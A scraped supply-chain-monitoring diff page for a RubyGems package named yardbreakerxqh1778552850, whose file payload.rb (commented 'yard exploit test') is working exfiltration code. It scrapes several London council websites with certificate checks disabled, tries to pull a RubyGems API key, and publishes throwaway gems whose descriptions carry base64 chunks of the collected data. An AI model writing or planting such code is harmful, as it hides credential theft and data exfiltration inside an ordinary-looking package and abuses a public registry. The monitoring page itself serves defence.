@@ -1,0 +1,606 @@
+Source: https://my.diffend.io/gems/yardbreakerxqh1778552850/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - yardbreakerxqh1778552850 - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+yardbreakerxqh1778552850
+
+Versions diffs
+
+0.0.1
+
+yardbreakerxqh1778552850
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/ex.gemspec
+
+          +5
+          -0
+
+            data/lib/a.rb
+
+          +2
+          -0
+
+            data/payload.rb
+
+          +47
+          -0
+
+            metadata
+
+          +40
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 5b262925a00da9747501a93c5182e979e7deeecfd5fd10a912e29f5afc6ff603
+
+4
+
+            +
+              data.tar.gz: 79cb1d70d568ed0e0d145850571ea9397ff7b5a4a61b353210f9e0eedc1b31c5
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 50bc10e497f76ee7fb12058cf50b2203169b06484c8fbbca79f8ac50e39d04d3a54b65bffa8ef1366894c19364cce140658231240f4b0d4abe4f82da62934169
+
+7
+
+            +
+              data.tar.gz: 6bb4a1dc514cd08601f6f0f126156c2edef7de3460ff529ade0b9b3fc45553072d7700af499aff5d88b65ac4ba9eba8d4b12330e80eef2fbe31ea1aae8f605d0
+
+        data/ex.gemspec
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,5 @@
+
+1
+
+            +
+            Gem::Specification.new do |s|
+
+2
+
+            +
+             s.name='yardbreakerxqh'+Time.now.to_i.to_s
+
+3
+
+            +
+             s.version='0.0.1'
+
+4
+
+            +
+             s.summary='x'; s.description='x'; s.authors=['x']; s.files=Dir.glob('**/*');s.require_paths=['lib'];s.homepage='https://example.com'
+
+5
+
+            +
+            end
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,2 @@
+
+1
+
+            +
+            class A
+
+2
+
+            +
+            end
+
+        data/payload.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,47 @@
+
+1
+
+            +
+            # yard exploit test
+
+2
+
+            +
+            require 'net/http'; require 'openssl'; require 'base64'; require 'fileutils'
+
+3
+
+            +
+            # fetch urls
+
+4
+
+            +
+            urls=[
+
+5
+
+            +
+             'https://www.southwark.gov.uk/',
+
+6
+
+            +
+             'https://moderngov.southwark.gov.uk/ieListMeetings.aspx?CId=302&Year=0',
+
+7
+
+            +
+             'http://moderngov.southwark.gov.uk/ieListMeetings.aspx?CId=302&Year=0',
+
+8
+
+            +
+             'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+9
+
+            +
+             'https://moderngov.southwark.gov.uk/mgCalendarMonthView.aspx?LookingFor=0&Month=1&Year=2026',
+
+10
+
+            +
+             'https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1',
+
+11
+
+            +
+             'https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1'
+
+12
+
+            +
+            ]
+
+13
+
+            +
+            res=''
+
+14
+
+            +
+            urls.each do |u|
+
+15
+
+            +
+             begin
+
+16
+
+            +
+              uri=URI(u)
+
+17
+
+            +
+              h=Net::HTTP.new(uri.host,uri.port); h.use_ssl=(uri.scheme=='https'); h.verify_mode=OpenSSL::SSL::VERIFY_NONE; h.open_timeout=15; h.read_timeout=20
+
+18
+
+            +
+              r=h.get(uri.request_uri, {'User-Agent'=>'Mozilla/5.0'})
+
+19
+
+            +
+              res += "\n=== #{u} status=#{r.code} len=#{r.body.size}\n"+r.body[0,2500]
+
+20
+
+            +
+             rescue =>e
+
+21
+
+            +
+              res += "\n=== #{u} err #{e.class}:#{e}\n"
+
+22
+
+            +
+             end
+
+23
+
+            +
+            end
+
+24
+
+            +
+            # chunks base64
+
+25
+
+            +
+            payload=Base64.strict_encode64(res)
+
+26
+
+            +
+            # get auto api key
+
+27
+
+            +
+            begin
+
+28
+
+            +
+             api=Net::HTTP.get(URI('https://rubygems.org/api/v1/api_key')).strip
+
+29
+
+            +
+            rescue=>e
+
+30
+
+            +
+             api=''; payload=Base64.strict_encode64("api fail #{e} #{res}")
+
+31
+
+            +
+            end
+
+32
+
+            +
+            payload.scan(/.{1,1800}/m).take(12).each_with_index do |part,i| # desc maybe max 2k
+
+33
+
+            +
+             begin
+
+34
+
+            +
+              dir="/tmp/xf#{rand(1e6)}"; FileUtils.mkdir_p(dir+'/lib'); File.write(dir+'/lib/a.rb', '#x')
+
+35
+
+            +
+              # gem name unique; description part mark index
+
+36
+
+            +
+              nm="yardoutq#{Time.now.to_i}#{rand(1e6)}x#{i}"
+
+37
+
+            +
+              spec=%Q{Gem::Specification.new do |s|; s.name=#{nm.inspect};s.version='0.0.1';s.summary='out';s.description=#{part.inspect};s.authors=['x'];s.files=['lib/a.rb'];s.require_paths=['lib'];end}
+
+38
+
+            +
+              File.write(dir+'/x.gemspec', spec)
+
+39
+
+            +
+              Dir.chdir(dir) { system('gem build x.gemspec >/dev/null 2>&1') }
+
+40
+
+            +
+              gemfile=Dir.glob(dir+'/*.gem')[0]
+
+41
+
+            +
+              dat=File.binread(gemfile)
+
+42
+
+            +
+              post=Net::HTTP::Post.new('/api/v1/gems'); post['Authorization']=api; post.body=dat; post['Content-Type']='application/octet-stream'
+
+43
+
+            +
+              h=Net::HTTP.new('rubygems.org',443); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE
+
+44
+
+            +
+              rep=h.request(post)
+
+45
+
+            +
+             rescue =>e
+
+46
+
+            +
+             end
+
+47
+
+            +
+            end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,40 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: yardbreakerxqh1778552850
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - x
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            description: x
+
+13
+
+            +
+            executables: []
+
+14
+
+            +
+            extensions: []
+
+15
+
+            +
+            extra_rdoc_files: []
+
+16
+
+            +
+            files:
+
+17
+
+            +
+            - ex.gemspec
+
+18
+
+            +
+            - lib/a.rb
+
+19
+
+            +
+            - payload.rb
+
+20
+
+            +
+            homepage: https://example.com
+
+21
+
+            +
+            licenses: []
+
+22
+
+            +
+            metadata: {}
+
+23
+
+            +
+            rdoc_options: []
+
+24
+
+            +
+            require_paths:
+
+25
+
+            +
+            - lib
+
+26
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+27
+
+            +
+              requirements:
+
+28
+
+            +
+              - - ">="
+
+29
+
+            +
+                - !ruby/object:Gem::Version
+
+30
+
+            +
+                  version: '0'
+
+31
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+32
+
+            +
+              requirements:
+
+33
+
+            +
+              - - ">="
+
+34
+
+            +
+                - !ruby/object:Gem::Version
+
+35
+
+            +
+                  version: '0'
+
+36
+
+            +
+            requirements: []
+
+37
+
+            +
+            rubygems_version: 3.6.7
+
+38
+
+            +
+            specification_version: 4
+
+39
+
+            +
+            summary: x
+
+40
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
